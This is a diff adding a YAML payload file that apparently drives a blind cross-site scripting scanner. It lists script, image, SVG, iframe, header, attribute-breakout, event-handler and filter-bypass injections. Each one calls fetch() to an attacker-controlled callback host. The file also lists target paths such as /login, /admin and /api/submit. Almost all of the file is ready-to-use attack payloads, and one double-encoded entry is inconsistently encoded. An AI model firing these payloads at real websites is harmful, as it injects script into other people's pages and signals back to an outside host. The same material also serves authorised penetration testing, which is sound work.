@@ -1,0 +1,183 @@
+category_map:
+  input:
+    - script_input
+    - img_input
+    - svg_input
+    - iframe_input
+    - details_input
+  header:
+    - referer_xss
+    - useragent_xss
+    - cookie_xss
+    - xforwarded_xss
+    - custom_header_xss
+  attr:
+    - alt_xss
+    - title_xss
+    - placeholder_xss
+    - href_xss
+    - src_xss
+  event:
+    - onerror_xss
+    - onload_xss
+    - onfocus_xss
+    - onmouseover_xss
+    - onstart_xss
+  bypass:
+    - double_encode
+    - null_terminate
+    - case_mixed
+    - unicode_bypass
+    - whitespace_bypass
+
+input_payloads:
+  - - script_input
+    - '<script>fetch("{{callback}}")</script>'
+    - - script
+      - callback
+      - xss
+  - - img_input
+    - '<img src=x onerror="fetch(''{{callback}}'')">'
+    - - img
+      - onerror
+      - callback
+  - - svg_input
+    - '<svg onload="fetch(''{{callback}}'')">'
+    - - svg
+      - onload
+      - callback
+  - - iframe_input
+    - '<iframe src="javascript:fetch(''{{callback}}'')">'
+    - - iframe
+      - javascript
+      - callback
+  - - details_input
+    - '<details open ontoggle="fetch(''{{callback}}'')">'
+    - - details
+      - ontoggle
+      - callback
+
+header_payloads:
+  - - referer_xss
+    - Referer
+    - '<script>fetch("{{callback}}")</script>'
+    - - script
+      - callback
+      - referer
+  - - useragent_xss
+    - User-Agent
+    - '<script>fetch("{{callback}}")</script>'
+    - - script
+      - callback
+      - user-agent
+  - - cookie_xss
+    - Cookie
+    - 'session=<script>fetch("{{callback}}")</script>'
+    - - script
+      - cookie
+      - callback
+  - - xforwarded_xss
+    - X-Forwarded-For
+    - '<script>fetch("{{callback}}")</script>'
+    - - script
+      - callback
+      - x-forwarded
+  - - custom_header_xss
+    - X-Custom-Header
+    - '<script>fetch("{{callback}}")</script>'
+    - - script
+      - callback
+      - custom
+
+attr_payloads:
+  - - alt_xss
+    - '" onerror="fetch(''{{callback}}'')" alt="'
+    - - onerror
+      - callback
+      - alt
+  - - title_xss
+    - '" onfocus="fetch(''{{callback}}'')" title="'
+    - - onfocus
+      - callback
+      - title
+  - - placeholder_xss
+    - '" onmouseover="fetch(''{{callback}}'')" placeholder="'
+    - - onmouseover
+      - callback
+      - placeholder
+  - - href_xss
+    - '" onclick="fetch(''{{callback}}'')" href="'
+    - - onclick
+      - callback
+      - href
+  - - src_xss
+    - '" onload="fetch(''{{callback}}'')" src="'
+    - - onload
+      - callback
+      - src
+
+event_payloads:
+  - - onerror_xss
+    - '"><img src=x onerror="fetch(''{{callback}}'')">'
+    - - onerror
+      - callback
+      - img
+  - - onload_xss
+    - '"><svg onload="fetch(''{{callback}}'')">'
+    - - onload
+      - callback
+      - svg
+  - - onfocus_xss
+    - '"><input onfocus="fetch(''{{callback}}'')" autofocus>'
+    - - onfocus
+      - callback
+      - input
+  - - onmouseover_xss
+    - '"><div onmouseover="fetch(''{{callback}}'')">hover</div>'
+    - - onmouseover
+      - callback
+      - div
+  - - onstart_xss
+    - '"><marquee onstart="fetch(''{{callback}}'')">'
+    - - onstart
+      - callback
+      - marquee
+
+bypass_payloads:
+  - - double_encode
+    - '%253Cscript%253Efetch(%2522{{callback}}%252522)%253C%252Fscript%253E'
+    - - script
+      - callback
+      - double
+  - - null_terminate
+    - '<script>fetch("{{callback}}")</script>%00'
+    - - script
+      - callback
+      - null
+  - - case_mixed
+    - '<ScRiPt>fetch("{{callback}}")</ScRiPt>'
+    - - script
+      - callback
+      - case
+  - - unicode_bypass
+    - '\\x3cscript\\x3efetch(\\x22{{callback}}\\x22)\\x3c/script\\x3e'
+    - - script
+      - callback
+      - unicode
+  - - whitespace_bypass
+    - '< script > fetch ( "{{callback}}" ) < /script >'
+    - - script
+      - callback
+      - whitespace
+
+sensitive_paths:
+  - /contact
+  - /feedback
+  - /comment
+  - /search
+  - /login
+  - /profile
+  - /settings
+  - /admin
+  - /api/submit
+  - /form
